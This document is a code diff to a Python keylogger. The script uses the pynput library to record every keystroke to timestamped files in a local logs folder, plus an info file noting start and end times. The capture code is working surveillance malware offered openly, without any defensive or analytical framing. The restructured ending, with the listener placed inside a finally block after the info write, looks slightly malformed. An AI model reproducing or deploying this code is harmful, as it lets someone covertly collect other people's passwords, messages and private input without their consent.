@@ -1,4 +1,5 @@
 #imported modules
+import os
 from pynput import keyboard
 from datetime import datetime
 
@@ -6,12 +7,17 @@ from datetime import datetime
 now = datetime.now()
 now = (now.strftime("%Y-%m-%d %H-%M"))
 
+# paths
+log_folder = os.path.join(os.getcwd(), "logs")
+log_file = os.path.join(log_folder, f"{now}_Keylogger_data.txt")
+info_file = os.path.join(log_folder, "log_files_id_info.txt")
+
+# ensure logs folder exists
+os.makedirs(log_folder, exist_ok=True)
+
 
 #creating and opening file
-with open("log_files_id_info.txt", "w") as file:
-    file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")
-
-with open(f"{now}_Keylogger_data" , "a") as file:
+with open(log_file , "a") as file:
     file.write(" ")
 
 
@@ -19,13 +25,13 @@ with open(f"{now}_Keylogger_data" , "a") as file:
 def pressed(key):
     try:
         key_pressed = format(key.char)
-        with open(f"{now}_Keylogger_data" , "a") as file:
+        with open(log_file, "a") as file:
 
             file.write(f'{key_pressed}')
 
     except:
         key_pressed = format(key)
-        with open(f"{now}_Keylogger_data", "a") as file:
+        with open(log_file, "a") as file:
             if key_pressed == 'Key.backspace':
                 file.write("*")
             if key_pressed == "Key.enter":
@@ -33,7 +39,17 @@ def pressed(key):
             if key_pressed == "Key.space":
                 file.write(" ")
 
-#start the listening
-with keyboard.Listener(
-    on_press=pressed) as listner:
-    listner.join()
+try:
+   pass
+except KeyboardInterrupt:
+    pass
+finally:
+    #getting the end time of the program
+    end_time = datetime.now().strftime("%Y-%m-%d %H-%M")
+    #saving all the info
+    with open(info_file, "a") as file:
+        file.write(f"Keylogger started at {now} and ended at {end_time} → File: {log_file}\n")
+
+ #run the listener
+    with keyboard.Listener(on_press=pressed) as listener:
+        listener.join()
